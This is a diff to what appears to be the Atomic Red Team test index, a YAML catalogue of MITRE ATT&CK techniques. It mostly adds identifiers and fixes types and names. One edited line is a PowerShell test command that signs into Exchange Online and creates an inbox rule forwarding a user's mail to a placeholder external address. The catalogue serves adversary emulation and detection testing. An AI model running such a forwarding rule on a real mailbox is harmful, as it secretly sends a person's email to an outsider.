@@ -7766,6 +7766,7 @@ defense-evasion:
       x_mitre_permissions_required:
       - User
       - root
+      identifier: T1612
     atomic_tests: []
   T1055.002:
     technique:
@@ -9512,11 +9513,11 @@ defense-evasion:
       input_arguments:
         username:
           description: office-365 username
-          type: String
+          type: string
           default: 
         password:
           description: office-365 password
-          type: String
+          type: string
           default: 
       dependency_executor_name: powershell
       dependencies:
@@ -11708,11 +11709,11 @@ defense-evasion:
       input_arguments:
         username:
           description: office-365 username
-          type: String
+          type: string
           default: 
         password:
           description: office-365 password
-          type: String
+          type: string
           default: 
       dependency_executor_name: powershell
       dependencies:
@@ -27503,6 +27504,7 @@ execution:
       - User
       - SYSTEM
       x_mitre_remote_support: true
+      identifier: T1559
     atomic_tests: []
   T1204.003:
     technique:
@@ -42040,19 +42042,19 @@ collection:
       input_arguments:
         username:
           description: office-365 username
-          type: String
+          type: string
           default: 
         password:
           description: office-365 password
-          type: String
+          type: string
           default: 
         rule_name:
           description: email rule name
-          type: String
+          type: string
           default: Atomic Red Team Email Rule
         forwarding_email:
           description: destination email addresses
-          type: String
+          type: string
           default: Atomic_Operator@fakeemail.aq
       dependency_executor_name: powershell
       dependencies:
@@ -42069,7 +42071,7 @@ collection:
           $secure_pwd = "#{password}" | ConvertTo-SecureString -AsPlainText -Force
           $creds = New-Object System.Management.Automation.PSCredential -ArgumentList "#{username}", $secure_pwd
           Connect-ExchangeOnline -Credential $creds
-          New-InboxRule -Name "#{rule_name}" -ForwardTo "{#forwarding_email}"
+          New-InboxRule -Name "#{rule_name}" -ForwardTo "#{forwarding_email}"
         cleanup_command: |
           $secure_pwd = "#{password}" | ConvertTo-SecureString -AsPlainText -Force
           $creds = New-Object System.Management.Automation.PSCredential -ArgumentList "#{username}", $secure_pwd
@@ -50173,6 +50175,7 @@ discovery:
       - 'Container: Container Enumeration'
       x_mitre_permissions_required:
       - User
+      identifier: T1613
     atomic_tests: []
   T1016.001:
     technique:
@@ -51288,6 +51291,7 @@ discovery:
       - 'Cloud Storage: Cloud Storage Metadata'
       x_mitre_attack_spec_version: 2.1.0
       x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      identifier: T1580
     atomic_tests: []
   T1217:
     technique:
@@ -52611,7 +52615,7 @@ discovery:
         macOS APT Activity Bradley)"
       modified: '2022-04-20T16:05:30.960Z'
       created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
-      name: Network Service Scanning
+      name: Network Service Discovery
       x_mitre_detection: |-
         System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.
 
@@ -63030,7 +63034,6 @@ exfiltration:
       - 'Network Traffic: Network Traffic Flow'
       - 'Network Traffic: Network Traffic Content'
       - 'File: File Access'
-      identifier: T1567
     atomic_tests: []
   T1029:
     technique:
